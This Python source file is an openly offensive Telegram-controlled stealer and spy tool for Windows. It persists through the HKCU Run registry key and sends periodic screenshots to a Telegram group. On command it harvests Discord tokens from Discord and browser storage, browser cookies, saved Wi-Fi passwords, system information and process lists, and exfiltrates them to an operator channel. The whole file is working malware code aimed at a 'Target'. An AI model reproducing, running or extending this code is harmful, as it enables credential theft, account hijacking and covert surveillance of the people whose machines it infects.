import telebot
import json
import pyautogui
import csv
import winreg
import os
import time
import subprocess, re

from functions.hardware import get_tasks, get_system_info
from functions.browser import get_browser_cookies


get_tasks()
get_system_info()


TOKEN = 'yourtokken'
COMMAND_ID = 'channel-command-id'
AUTOSPY_GROUP_ID = 'auto-screen-id'
AUTOSPY_INTERVAL = 300

bot = telebot.TeleBot(TOKEN)

def send_screenshot_loop(bot):
    while True:
        send_screenshot_to_group(bot, AUTOSPY_GROUP_ID)
        time.sleep(AUTOSPY_INTERVAL)

def send_screenshot_to_group(bot, group_id):
    screenshot = pyautogui.screenshot()
    screenshot_file = 'schnegge.png'
    screenshot.save(screenshot_file)
    with open(screenshot_file, 'rb') as f:
        bot.send_photo(group_id, f)
    os.remove(screenshot_file)

def register_startup():
    script_path = os.path.abspath(__file__)
    startup_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_WRITE
    )
    winreg.SetValueEx(
        startup_key,
        "rpz-discordkitten",
        0,
        winreg.REG_SZ,
        script_path
    )
    winreg.CloseKey(startup_key)

def send_tasks_csv():
    tasks = get_tasks()
    filename = 'tasks.csv'
    with open(filename, mode='w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['pid', 'name'])
        writer.writeheader()
        for task in tasks:
            writer.writerow(task)

    with open(filename, 'rb') as f:
        bot.send_document(COMMAND_ID, f)

    os.remove(filename)

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

@bot.message_handler(commands=['discord'])
def send_discord_tokens(message):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message_text = ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message_text += f'`{token}`\n\n'
        else:
            message_text += 'No tokens found.\n'

    with open('discord_tokens.csv', 'w') as f:
        f.write(message_text)

    with open('discord_tokens.csv', 'rb') as f:
        bot.send_document(COMMAND_ID, f)

    os.remove('discord_tokens.csv')


@bot.message_handler(commands=['chatid'])
def send_chat_id(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, f"This chat/group's ID is: {chat_id}")


@bot.message_handler(commands=['wifi'])
def get_wifi_password(message):
    try:
        command = "netsh wlan show profile"
        result = ""
        networks = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        networks = networks.decode(encoding="utf-8", errors="strict")
        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

        for network_name in network_names_list:
            try:
                command = "netsh wlan show profile " + network_name + " key=clear"
                current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                current_result = current_result.decode(encoding="utf-8", errors="strict")

                ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)

                result += "\n\nSSID           : " + ssid[0] + "\n"
                result += "Authentication : " + authentication[0] + "\n"
                result += "Cipher         : " + cipher[0] + "\n"
                result += "Security Key   : " + security_key[0] + "\n"
                result += "Password       : " + password[0]
            except Exception:
                pass
        bot.send_message(message.chat.id, result)
    except subprocess.CalledProcessError:
        bot.send_message(message.chat.id, "No saved Wi-Fi profiles found.")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = "Available commands:\n\n"
    help_text += "🔒 /discord - Get Discord tokens\n"
    help_text += "🍪 /browsercookies - Get browser cookies\n"
    help_text += "🖥️ /systeminfo - Get system information\n"
    help_text += "📷 /screenshot - Take a screenshot of the Target\n"
    help_text += "📋 /tasks - Get all tasks in CSV format\n"
    help_text += "📡 /wifi - Get saved Network data.\n"
    help_text += "🆔 /chatid - Get the current Chat/Group ID\n"
    bot.send_message(COMMAND_ID, help_text)

@bot.message_handler(commands=['browsercookies'])
def send_browser_cookies(message):
    cookies = get_browser_cookies()
    cookies_str = json.dumps(cookies, indent=4)
    bot.send_message(COMMAND_ID, cookies_str)

@bot.message_handler(commands=['systeminfo'])
def send_system_info(message):
    system_info = get_system_info()
    system_info_str = json.dumps(system_info, indent=4)
    bot.send_message(COMMAND_ID, system_info_str)

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    screenshot = pyautogui.screenshot()
    screenshot_file = 'screenshot.png'
    screenshot.save(screenshot_file)
    with open(screenshot_file, 'rb') as f:
        bot.send_photo(COMMAND_ID, f)
    os.remove(screenshot_file)

@bot.message_handler(commands=['tasks'])
def send_tasks(message):
    send_tasks_csv()

register_startup()
while True:
    try:
        bot.polling()
    except Exception:
        time.sleep(15)


